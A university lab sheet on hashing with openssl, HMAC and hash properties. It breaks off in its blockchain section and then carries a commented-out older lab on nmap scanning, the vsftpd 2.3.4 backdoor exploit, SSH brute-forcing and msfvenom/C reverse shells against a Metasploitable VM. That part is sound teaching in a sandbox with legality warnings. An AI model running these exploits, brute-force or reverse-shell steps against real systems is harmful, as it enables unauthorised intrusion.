# Lab 1: Hashing and Blockchain

## 1.1. Introduction
There are many fundamental concepts in cryptography and cybersecurity, hashing and blockchain are among one of those. In this lab, we will explore the concept of hashing and blockchain and their applications. We will start with hashing.

## 1.2. Hashing
Hashing is a process of mapping data of arbitrary size to data of fixed size. The output of a hash function is called a hash value, hash code, hash sum, or simply hash. Hashing is used in many applications, such as password storage, digital signatures, and blockchain. Hash functions have the properties of being quick, irreversible, and collision free (i.e., no two messages will end up with the same hash value). 

### 1.2.1. Hashing Algorithms
There are many different hashing algorithms used in practice, such as MD5, SHA-1, SHA-2, and SHA-3. We will experiment with some of those algorithms in this lab. For this, we will use the Kali Linux VM. You should have openssl already on your VM, check by typing `openssl` in the terminal. If not, you can install it by typing `sudo apt install openssl`. If properly installed, you should see something like below when you type in `openssl help` in the terminal:

<figure><img src="./img/hash_openssl.png" alt=""><figcaption></figcaption></figure>

To use hashing algorithms, we will use the digest command in openssl:

    openssl dgst -[hashing algorithm] [file]


For example, to hash the file `test.txt` using MD5, type:
    
    openssl dgst -md5 test.txt


It will look something like below:

<figure><img src="./img/hash_md5.png" alt=""><figcaption></figcaption></figure>

You can hash texts without creating the file by piping the text to openssl:

<figure><img src="./img/hash_md5_2.png" alt=""><figcaption></figcaption></figure>

You will notice that the hash values are different, because the hash of the file includes the file headers and other information associated with the file, whereas the hash of the text does not include such information.

Voila! This is how simple it is to generate hash values of files and texts!

### 1.2.2. Keyed hash and HMAC
You can also hash a file using a key. This is called a keyed hash. To do this, you can use the `-hmac` option in openssl:

    openssl dgst -[hashing algorithm] -hmac [key] [file]

<figure><img src="./img/hash_hmac.png" alt=""><figcaption></figcaption></figure>

You can see from the above image, that the hash value would be different if the key is incorrect. This is useful for verifying the integrity of the file sent from someone - the sender could generate a hash value using a shared secret key, so when the file needs to be verified, the receiver could use the same secret key to verify that the same hash value is generated. If they are not the same hash value, then the receiver knows that the file is different to what the sender has sent. It is also near impossible to tamper the generated hash value without knowing the secret key, so the integrity of the file can be guaranteed with high confidence.

#### TASK 1 Experiment with different keys
Try to use different keys to generate the hash value of the same file. Then, change something from the original file and try to generate the same hash value (by guessing a new key) that matches the original hash value. Discuss your observation with your peers and/or the lab facilitator.

Question: Is there any requirement for the key to be used for keyed hashing? (Some research should be conducted to see what happens to the key!)

### 1.2.3. Properties of one-way hash functions
To understand the properties of one-way hash functions, we will setup an experiment to conduct. 

1. Hash the text "This is a hash message" and generate the hashvalue H1 using a specific hash algorithm (e.g., MD5, SHA256).
2. Hash the text "This ir a hash message" and generate the hashvalue H2 using the same hash algorithm. Note that a letter 's' has been changed to 'r'.
3. Observe whether H1 and H2 (both should be saved onto files) are similar or not. You should write a simple program to compare how many bits are the same between H1 and H2.

#### TASK 2 Write the program to compare the hash values
Write a program to compare the hash values H1 and H2. The program should compare the hash values byte by byte and count how many bytes are the same. Discuss your observation with your peers and/or the lab facilitator.

(optional) Examine the number of bits that are different between H1 and H2 by writing a code for bit comparions.


### 1.2.4. One-way vs. collision-free properties
One-way hash functions are not necessarily collision-free. Collision-free means that it is impossible to find two different messages that have the same hash value. However, one-way hash functions are designed to be computationally infeasible to find a message that has a specific hash value. This means that it is possible to find two different messages that have the same hash value, but it is computationally infeasible to find such messages.

You are given a oneway.py file:

```
wget https://github.com/uwacyber/cits2006/raw/2024/cits2006-labs/files/oneway.py
```

Open and inspect the code. It tests a one-way property of hash functions. It currently implements MD5, but you can easily replace that with other hash functions to test. 

#### TASK 3 Implement Collision-free property checking code
Similar to the one-way property checking code provided above, you can check the collision-free property of hash functions. You may use the template collisionfree.py:

```
wget https://github.com/uwacyber/cits2006/raw/2024/cits2006-labs/files/collisionfree.py
```

Complete the code and examine the collision-free property of various hash functions.


<b>Question:</b> Which property is easier to break using bruteforce attack? Conduct a scientific experiments to prove your point. Discuss with your peers and/or the lab facilitator.


Based on the findings above, it should be clear that it is nearly impossible to break modern hash functions using bruteforce atttacks. Many of the cybersecurity concepts, methods and approaches rely on cryptographic properties such as above in order to provide security guarantees.

## 1.3. Blockchain
Now we will look at blockchain, which is a distributed ledger technology that is used in many applications, such as cryptocurrencies (e.g., Bitcoin, Ethereum), smart contracts, and supply chain management. Blockchain is an example of using hash functions as its primitive building blocks to create an architecture that can be useful in practice with cryptographic properties to guarantee the security. Blockchain is a chain of blocks that contain data. Each block contains a hash value of the previous block, so it is impossible to modify the data in the previous block without changing the hash value. This is because the hash value of the previous block is used to generate the hash value of the current block. 

<!-- {% hint style="danger" %}
READ: Any knowledge and techniques presented here are for your learning purposes only. It is **ABSOLUTELY ILLEGAL** to apply the learned knowledge to others without proper consent/permission, and even then, you must check and comply with any regulatory restrictions and laws.
{% endhint %}

The aim of this lab is to introduce you to some useful network exploit concepts and tools commonly used to get familiar with attack styles, as well as practice Linux commands from Lab 0 in the context. In addition, to have a better understanding about the underlying mechanisms of tools, unlike in CITS1003 where we just used tools to observe outcomes.

{% hint style="info" %}
This means it is essential to have a deeper understanding of tools and how they operate rather than only learning what tools and scripts to use in given scenarios. This applies to all the labs we will do in this unit, so please remember!
{% endhint %}

The tools we will cover are: `nmap` and `metasploit`, the tools that are often used to gather information and gain the first step into the target host(s). Those tools are already installed on your Kali Linux. Of course, we will cover more useful and interesting tools later on as well.

{% hint style="info" %}
In this lab, we will be running at least two VMs: Kali and metasploitable.
{% endhint %}

## 1.0. vulnerable VM: metasploitable

First, we will set up a vulnerable VM named [_metasploitable_](https://docs.rapid7.com/metasploit/metasploitable-2) (click the link and download the VM).

If your machine uses an Intel chip AMD64, you can move on to the next tasks.

If your machine uses an Apple Silicon ARM64, you must do the following tasks to run metasploitable on UTM:

1. Install [brew](https://brew.sh/) if not done already
2. Install qemu if not done already: `brew install qemu`
3. Navigate to the directory containing the metasploitable image file you downloaded
4. Convert image:\
   `qemu-img convert -p -O qcow2 Metasploitable.vmdk Metasploitable.qcow2`
5. Open UTM: add new -> Emulate -> Other -> skip ISO
6. Settings -> remove drive
7. Settings -> QEMU -> untick "UEFI boot"
8. Settings -> add drive -> select the created image (`.qcow2` file) from step 4
9. Start the VM

Please note, that the VMs used in the lab should be able to reach each other (test using `ping`).

## 1.1. Port Scan using Bash

First, let's create our own port scanner using a bash script to understand how a script may be created and be used.

This only works on new versions of Bash (which is the case with Kali). If you are not using Kali, you can test by following the steps below:

1. start a netcat listener on terminal 1: `nc -vnlp 4444`
2. On a different terminal (terminal 2), start a bash session: `bash`
3. Still on terminal 2, send a message using the cat command:\
   `cat >/dev/tcp/localhost/4444`
4. From terminal 1, you should see a connection message
5. You can press `ctrl + C` to end

If you do not see the connection message at step 4, then you need to upgrade your Bash version (or use Kali for simplicity). If you attempt to connect to a closed port, you will simply receive a "Connection refused" message.

So we have a basic understanding of using Bash and open ports from the above example, so now we can create our own port scanner Bash script!

Download the portscan.sh script:

```
wget https://github.com/uwacyber/cits3006/raw/2023S2/cits3006-labs/files/portscan.sh
```

The code is also shown below, which you should read through and try to understand what it is trying to do.

```bash
#!/bin/bash
if [ $# -ne 1 ]
then
    echo "Usage: `basename $0` {IP address or hostname}"
    exit 1
fi

# define a variable and set it to the value passed as the first argument ($1)
ip_address=$1
# write the current date to the output file
echo `date` >> $ip_address.open_ports

# for loop, where “i” starts at 1 and each time increments up to 65535
for port in {1..65535}
do
    # use a short timeout, and write to the port on the IP address
    timeout 1 echo >/dev/tcp/$ip_address/$port
    # if that succeeded (checks the return value stored in $?)
    if [ $? -eq 0 ]
    then
        # append results to a file named after the date and host
        echo "port $port is open" >> "$ip_address.open_ports"
    fi
done
```

{% hint style="info" %}
If the above code is hard to follow, please revise the scripting materials (e.g., CITS2003).
{% endhint %}

Remember to add executable permission:

```
chmod +x portscan.sh
```

Now we can run it, let's run it against the metasploitable VM (check its IP address by running `ifconfig`):

```
./portscan.sh [target IP]
```

Note that this is quite slow (give it a few mins), but once done, it will create a result file `[target IP].open_ports`. You can run the script against other VMs if you have, or locally by inputting `localhost`.

![](<../.gitbook/assets/image (6) (1) (1) (1).png>)

We just created our own port scanner using Bash!

The underlying principle is the same, the tools we will cover next will have some scripts that carry out the specified tasks like above, which are just automatically ran through the tool commands.

## 1.2. Nmap

Since writing scripts ourselves is inefficient, we now will have a look at a tool named _Nmap_.

Nmap is an open-source tool for network exploration and security auditing. It inspects raw IP packets to find various information about the network and systems, including services (name and version), OS and versions, firewalls, and more. Nmap is useful for system administration (e.g., network inventory, service upgrades, monitoring, etc.), but of course, it is also useful for malicious purposes.

The first intuitive use of Nmap is to scan the network to find (a potentially vulnerable) host(s). This can be done by scanning the IP range.

`$ nmap -sn [target IP range]`

e.g.,

```
nmap -sn 192.168.64.0/24
```

![](<../.gitbook/assets/image (3) (1) (1) (1) (1).png>)

Here, the flag `-sn` indicates that it uses ping to check whether the host exists or not. So this is basically a script that runs a ping command to the given network address(es)! There are other flags that could be used, which you can find more from [>>here<<](https://nmap.org/book/man-briefoptions.html).

One of the listed addresses should be your victim machine (metasploitable VM).

{% hint style="warning" %}
If you don't see your metasploitable VM in the list, please check your network settings.
{% endhint %}

Now we have discovered our target machine, we can scan to see which ports are open (i.e., what services are running).

```
nmap -sV -O -T4 192.168.64.5
```

{% hint style="warning" %}
Find out what those flags mean.
{% endhint %}

Then we should be able to see something like:

![](<../.gitbook/assets/image (6) (1) (1) (1) (1).png>)

So we have used Nmap to discover hosts in the network, and also scan them to find services and OS details. Just remember, Nmap is just executing a bunch of scripts like we wrote in the previous section, just automated. So you can always dig through its exploit database and have a look at the details of those attacks (because it is open-source, it is possible).

Now we will move on to gaining access by exploiting some of the vulnerabilities associated with the services we found.

## 1.3. Metasploit

For this part of the lab, we will carry out a few exploits using the Metasploit framework. The Metasploit framework is essentially (and also) a collection of scripts that performs the described exploit, and most scripts are targeting vulnerabilities on networks and servers. The Metasploit framework is open-source, so it can also be customised to various needs. So let's have a look at a few exploit examples in this lab.

First, you may need to update it to the latest version.

```
sudo apt update -y; sudo apt install metasploit-framework -y
```

From the nmap scan above, we have discovered the IP address of our target (metasploitable VM) machine and the services running. The first one we will exploit is the one at the top at port 21 - the FTP service.

### 1.3.1. Exploit FTP

The Nmap scan revealed the version of the FTP on the target machine. If you search for vulnerabilities associated with the given version `vsftpd 2.3.4`, you will quickly discover that there is a backdoor vulnerability (more precisely, [`CVE-2011-2523`](https://www.cvedetails.com/cve/CVE-2011-2523/)). The CVSS Score is 10, indicating that the impact of this vulnerability is severe.

Since it's there, we'll exploit it. Launch the Metasploit from the terminal:

```vim
msfconsole
```

![](<../.gitbook/assets/image (5) (1) (1) (1) (1).png>)

From the msfconsole, we can search for the identified service-related exploits

```
use vsftpd
```

![](<../.gitbook/assets/image (4) (1) (1) (1) (1) (1).png>)

In fact, there is only one exploit (the backdoor one) available, so it will be automatically be selected. If it is not automatically selected, just type: `use 0` (i.e., the number 0th exploit) to select it.

{% hint style="info" %}
If you already know the exploit to use and its path, you can type in:

`use [path to the exploit]`
{% endhint %}

Next, we need to check options to see what inputs the exploit requires.

```
show options
```

![](<../.gitbook/assets/image (2) (1) (1) (1) (1).png>)

The exploit is actually simple, and only requires the target host's IP address. So set the RHOST with the target IP address found using Nmap (the RPORT is already set, but if the FTP service runs on a different port or if the RPORT is not set, you can update/set it).

```
set RHOST 192.168.64.5
```

![](<../.gitbook/assets/image (1) (1) (1) (1).png>)

All options are set, so now we can run the exploit by simply typing `run`.

![](<../.gitbook/assets/image (2) (1) (1) (1) (2) (1).png>)

{% hint style="info" %}
The exploit may fail (as shown above), but you can simply run it again.
{% endhint %}

Now you have a remote shell on your target host! Try navigating, creating files, deleting files etc., and observe from your metasploitable VM to see those changes.

#### How does this exploit work?

This vulnerability came about when someone had uploaded a modified version of `vsftpd` to the master site and some users downloaded this version for their systems (i.e., it came with the backdoor). The backdoor opened port 6200 to give the attacker a command shell.

This showed the importance of authentication and authorisation (don't let anyone upload/update important data) and also the ability to check and approve changes.

#### Finishing

Finally, you can press `ctrl + C` to end the session. If you are finished with the exploit, you can type `back` to go back to the main `msfconsole` menu.

### 1.3.2. Exploit SSH

Okay, so the previous one is highly unlikely given the vulnerable service is more than a decade old and people have moved on. So let's try some other exploits against a more common service - SSH!

We assume we don’t know the credentials to log in to the metasploitable VM, so we must figure out both the username and password to gain access.

From Nmap scans, we know that the SSH service is running on port 22. However, its version is `OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)`. The protocol 1.0 had lots of bugs that could have been exploited easily, but 2.0 is much more secure. So instead, we will attempt a bruteforce attack.

Like before, we begin by searching for `ssh` related exploits in the Metasploit console:

```
search ssh
```

![](<../.gitbook/assets/image (4) (1) (1) (1) (1).png>)

... But there are too many! So let's reduce the selection to `ssh_login`:

```docker
search ssh_login
```

![](<../.gitbook/assets/image (6) (1) (1) (1) (2).png>)

Two shows up, and we will use the first one and check the options:

```
use 0
show options
```

![](<../.gitbook/assets/image (3) (1) (1) (1).png>)

Like before, set the `RHOST` to be the target IP address. In addition, we must also provide the wordlist for username and password (you can either provide a single file that contains the pairs in `USERPASS_FILE`, or separately to try all pairs from the two files for `USER_FILE` and `PASS_FILE`). You can also read other option descriptions to change as necessary. For our bruteforce attack, we will use a `USERPASS_FILE` that comes with Metasploit.

```
set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/piata_ssh_userpass.txt
```

![](<../.gitbook/assets/image (9) (3).png>)

At this point, we can run the exploit (you can try, but it will take a while because its bruteforce, took me about 15 mins to finish). Since we know the credentials (msfadmin/msfadmin), we can shorten the waiting time by creating a shortened userpass file from the original file above (i.e., delete bunch of lines but keep the actual credential). Once run, you should eventually get to this:

![](<../.gitbook/assets/image (1) (1) (2) (1).png>)

{% hint style="info" %}
You would notice that this is SSH session 3, meaning I did find two other credentials that could be used to SSH to the metasploitable VM. Which ones do you think they are?
{% endhint %}

At this stage, you can use the credentials found to SSH into the victim machine. However, this bruteforce attack is quite inefficient because we have to guess both username and password. Imagine each credential login attempt takes 1 second, how long would it take to try 1 million credential pairs? To get a better picture, the widely used password wordlist `rockyou.txt` contains about 14 million passwords! So we must find a better way than trying to guess both username and password. This brings us to the next method.

We are going to revisit Nmap here, because one of the services running was `Samba smbd` (an innocent server daemon that provides filesharing and printing services), which can be exploited to reveal users! So run Nmap:

```
nmap -script smb-enum-users.nse -p 445 [target IP address]
```

{% hint style="info" %}
The script is basically enumerating through users' RIDs that uniquely identifies a user on a domain or system. The username is found because LSA function is exposed, which is used to convert RID to the username.
{% endhint %}

If you scroll down the list, you will find that the user “msfadmin” is the one that is not disabled! So we can use this information back in our `ssh_login` options!

We will also use the `rockyou.txt` password wordlist file that contains a lot of commonly used passwords. It comes with Kali at `/usr/share/wordlists`, you just have to extract it:

```
sudo gzip -dk /usr/share/wordlists/rockyou.txt.gz
```

Once done, remove the USERPASS file and set USERNAME and PASS\_FILE.

```
unset USERPASS_FILE
set PASS_FILE /usr/share/wordlists/rockyou.txt
set USERNAME msfadmin
```

![](<../.gitbook/assets/image (5) (1) (1) (1).png>)

Now the bruteforce attack only has to guess the password!

{% hint style="info" %}
Although we have technically improved the attack speed, we are still (at the end of the day) bruteforcing – which is practically impossible nowadays. Such attacks can be mitigated easily by limiting the number of attempts within a given period of time, as well as enforcing multi-factor authentications.
{% endhint %}

### 1.3.3. Reverse Shell

The Metasploit also comes with tools to create vulnerable executable scripts/files using `msfvenom` module. For our instance, we will create a reverse shell using python code:

```
msfvenom -p python/shell_reverse_tcp LHOST=[attacker IP address] LPORT=[attacker listening port]
```

![](<../.gitbook/assets/image (3) (1) (1).png>)

The payload created is a python executable code, which you can execute from your victim host. You will also notice that `msfvenom` applied code obfuscation techniques so that you cannot directly read the payload to understand exactly what this code is doing.

{% hint style="info" %}
For this exercise, I just cloned my Kali VM and used it as the target. You can do similar, or run an existing VM and test also (should work on any OS).
{% endhint %}

But before you run the script (it will fail as you would have found out), you must first listen for activities from your attacker machine:

```
nc -lvnp 443
```

We set 443 to be the incoming port from the target host, so we listen on this port and wait until the target host executes the script. If this port isn't working for you, you can try a different port e.g., 4444. So now, let's execute the script from the target host:

```
python -c "[copy and paste payload here]"
```

![Left, you see the target host terminal. Right, you see the attacker terminal that got the reverse shell!](<../.gitbook/assets/image (4) (1) (1) (1).png>)

{% hint style="info" %}
Usually, the attacker will place the payload into an executable file (and likely autorun it). Such malicious payload can be created for various types of applications, not just Python (could be PHP, Java, .exe for Windows etc.). Also, there are many ways to hide such payload (masquerading, obfuscations etc.) – still a big issue today!
{% endhint %}

The above example would be considered _malware_. The `msfvenom` can be used to create various payloads to do malicious tasks so have a look at its library and explore (please do NOT use them other than on your own sandboxed/virtualised environments)!

### 1.3.4. Write our own Reverse Shell

So now we understand the tool can create reverse shell payloads for various applications, but how exactly does it work? Let's find out!

First, download the reverse shell files:

```
wget https://github.com/uwacyber/cits3006/raw/2023S2/cits3006-labs/files/rshell.zip
```

![](<../.gitbook/assets/image (4) (1) (1).png>)

Unzip using the `unzip` command.

Let's test it first, we have to update the attacker's IP address in the `victim.c` (at line 27) code (you can update the port too if you want, but make sure to do it on both files).

Once done, we can now compile the c codes using the makefile provided (if you have binaries in the zip, delete them and recompile).

![](<../.gitbook/assets/image (1) (2) (1).png>)

We can do this on a single machine, but you can also move the victim code to a different VM (remember to recompile if different architecture).

![For this example, I used two VMs - Kali (hacker) and Ubuntu (victim)](<../.gitbook/assets/image (8) (1) (1) (1).png>)

So it works! Let's have a closer look at the code, starting with the `hacker.c` file.

There isn't much to this code really (i.e., typical socket handling in c), the most interesting part is from lines 83 to 105:

![](<../.gitbook/assets/image (5) (1) (1) (2).png>)

This is where we prepare for command transmission (lines 93 - 96), and send the command (lines 99 - 103). Now let's have a look at the victim's code in `victim.c` file.

![](<../.gitbook/assets/image (7) (1) (1).png>)

Again, nothing much in the code other than typical socket coding for the client, BUT look at lines 61 - 63. This is where the reverse shell happens:

1. the [`dup2` function](https://man7.org/linux/man-pages/man2/dup.2.html) takes two arguments `oldfd` and `newfd`, where the two [file descriptors](https://en.wikipedia.org/wiki/File\_descriptor) (fd) are made equivalent (i.e., you can use either). For example, After `dup2(socket_id, 0)`, whatever file was opened on the descriptor `socket_id` is now also opened (with the same mode and position) on the descriptor `0`, i.e. on standard input.
2. This is applied to all other file descriptors 1 and 2 representing the standard output and the standard error, respectively.

This means all the `stdio` are redirected to the socket that is sent to the attacker (bad)!

{% hint style="info" %}
In normal server code, this is where the server would respond to the client with the response. But instead, since the victim's `stdio` are all redirected to the socket to the attacker, the attacker can now also _send_ commands back to the victim host (which is very bad!).
{% endhint %}

However, this code does not have any obfuscation, which means it is very easy to detect such code in use and be filtered/blocked. Hence, Metasploit tries to obfuscate the payload generated to hide such malicious code (but the detection mechanisms can also have their own techniques to look through obfuscations, albeit the performance varies).

## 1.4 Summary

In this lab, we covered two useful tools, Nmap and Metasploit. There were additional exercises to better understand how such tools work (port scanner and reverse shell) to provide a deeper understanding of different exploit techniques.

Next up, Malware.

{% hint style="info" %}
PREPARATION: the next lab uses a new VM - Windows. The ISO file is HUGE (\~10GB), so please download and set up the Windows VM before going to the lab.
{% endhint %} -->
